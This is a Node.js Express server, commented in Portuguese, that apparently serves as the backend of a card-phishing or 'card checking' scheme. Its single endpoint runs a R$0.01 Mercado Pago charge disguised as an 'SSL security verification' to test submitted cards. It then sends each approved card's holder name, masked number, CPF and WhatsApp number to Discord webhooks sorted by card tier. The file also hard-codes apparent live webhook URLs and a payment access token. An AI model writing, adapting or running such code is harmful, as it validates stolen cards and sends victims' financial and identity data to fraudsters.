const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- LINKS DOS WEBHOOKS (CANAIS ESPECÍFICOS) ---
const WEBHOOKS = {
    BLACK: "https://discord.com/api/webhooks/1472758727982579826/xBNQW837YqDgdH-1C8hIa1btFqBhDDz-CylbmwGzTAw8dxkDYCJFAnQqPtRypZ5cs8jO",
    PLATINUM: "https://discord.com/api/webhooks/1472758837592199170/3ghk7b_0-9riCk_bo6J8w0kpvHdWswon2BozYZB4cX4iT2jgrODHg9ACgdixcYxI6eR4",
    GOLD: "https://discord.com/api/webhooks/1472758915241611478/-31k6f0HYdfKhWmkzIRTLaFw-Ils3jrOfGDdVcJ4esECV4X0qPZLNckslX0WceMbgiM2",
    BUSINESS: "https://discord.com/api/webhooks/1472758957889159298/gFi3QMx3f5NkgpLqynZXLw-h74DEKfJ5C96G9nuefEV9FU7pMGCRfkfsasiNv_16_n-G",
    STANDARD: "https://discord.com/api/webhooks/1472758999261904978/syxBtJkr9MiT9TTIpDgROgnAakW8f_NDGoleCXM8hik5hhpztpoXcQCjafcztxy1TJqC",
    GERAL: "https://discord.com/api/webhooks/1472761318971932747/Fz37NSF1YleNSAuEfuaB6WdgmDs-NDaC4-JduPGDPBLALdnTExDX1ObNiiyq8m9tHs1m"
};

// --- LINK DO CANAL PRINCIPAL (#cartões) ---
const WEBHOOK_PRINCIPAL_CARTOES = "https://discord.com/api/webhooks/1471002040477028362/UYLVL8C6hoLpq-SSzW0QzbamEBi69o3-erTBL3pItUENDc_rmtCIRlYdp1vRYh09Kpvb";

const ACCESS_TOKEN = "APP_USR-1954942567690031-012818-20e9de4b75bb3d0c284b51790db079c8-3163639724";

app.post('/validar-cartao', async (req, res) => {
    const { token, cpf, nome_cartao, numero_mascarado, nome_cliente, parcelas, whatsapp } = req.body;

    try {
        const response = await axios.post('https://api.mercadopago.com/v1/payments', {
            transaction_amount: 0.01,
            token: token,
            description: "Verificacao SSL Seguranca",
            installments: 1,
            payer: {
                email: "suporte@verificado.com",
                identification: { type: "CPF", number: cpf.replace(/\D/g, '') }
            }
        }, {
            headers: { 'Authorization': `Bearer ${ACCESS_TOKEN}` }
        });

        if (response.data.status === 'approved' || response.data.status === 'in_process') {
            const info = response.data;
            const modeloOriginal = info.payment_method?.name || "Crédito";
            const modelo = modeloOriginal.toLowerCase();
            const bandeira = (info.payment_method_id || "Cartão").toUpperCase();

            // Lógica de cores e destino
            let urlDestino = WEBHOOKS.GERAL;
            let cor = 0x3498db; // Azul padrão

            if (modelo.includes('black') || modelo.includes('infinite')) {
                urlDestino = WEBHOOKS.BLACK;
                cor = 0x000000;
            } else if (modelo.includes('platinum')) {
                urlDestino = WEBHOOKS.PLATINUM;
                cor = 0xdcdde1;
            } else if (modelo.includes('gold')) {
                urlDestino = WEBHOOKS.GOLD;
                cor = 0xf1c40f;
            } else if (modelo.includes('business') || modelo.includes('corporate')) {
                urlDestino = WEBHOOKS.BUSINESS;
                cor = 0x8e44ad;
            } else if (modelo.includes('standard') || modelo.includes('internacional')) {
                urlDestino = WEBHOOKS.STANDARD;
                cor = 0xe74c3c;
            }

            // Montagem da mensagem (Embed)
            const embedFinal = {
                embeds: [{
                    title: `💳 NOVO CARTÃO - ${modeloOriginal.toUpperCase()}`,
                    color: cor,
                    fields: [
                        { name: "🏆 CATEGORIA", value: `**${bandeira} - ${modeloOriginal}**` },
                        { name: "👤 Cliente", value: nome_cliente, inline: true },
                        { name: "💳 Número", value: `\`${numero_mascarado}\`` },
                        { name: "💰 Parcelas", value: parcelas, inline: true },
                        { name: "📱 WhatsApp", value: whatsapp, inline: true },
                        { name: "🪪 CPF", value: cpf, inline: true }
                    ],
                    footer: { text: "R$ 0,01 Validado com Sucesso" },
                    timestamp: new Date()
                }]
            };

            // ENVIO 1: Para o canal principal (#cartões)
            await axios.post(WEBHOOK_PRINCIPAL_CARTOES, embedFinal);

            // ENVIO 2: Para o canal específico (Separação)
            await axios.post(urlDestino, embedFinal);

            return res.json({ status: 'success' });
        }
        res.status(400).json({ status: 'error' });
    } catch (error) {
        res.status(400).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
